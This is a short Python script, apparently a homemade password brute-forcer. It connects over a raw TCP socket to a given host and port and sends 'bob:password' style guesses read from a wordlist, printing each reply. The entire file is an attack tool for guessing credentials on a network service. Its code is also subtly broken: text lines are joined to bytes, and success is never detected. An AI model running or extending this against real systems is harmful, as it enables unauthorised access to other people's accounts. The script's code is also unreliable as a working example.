#!/usr/bin/python3

import socket
import argparse

parser = argparse.ArgumentParser(description="Python brute forcer")
parser.add_argument("host", help="Target IP Address")
parser.add_argument("port",type=int, help="Target port number")
parser.add_argument("--wordlist", help="Location of wordlist")

args = parser.parse_args()

HOST= args.host
PORT= args.port

s = None
def connect():
        global s
        s = socket.socket()
        s.connect((HOST,PORT))

def login(uname, password):
        connect()
        buf = b""
        buf += uname
        buf += b":"
        buf += password

        s.send(buf)
        r = s.recv(4096)
        print(password + r)
        s.close()

if args.wordlist:
        print("Wordlist Found")
        fp = open(args.wordlist, 'r')
        for line in fp:
                guess = line
                if login(b"bob",guess):
                        break
        fp.close()
else:
        login(b"bob",b"password")
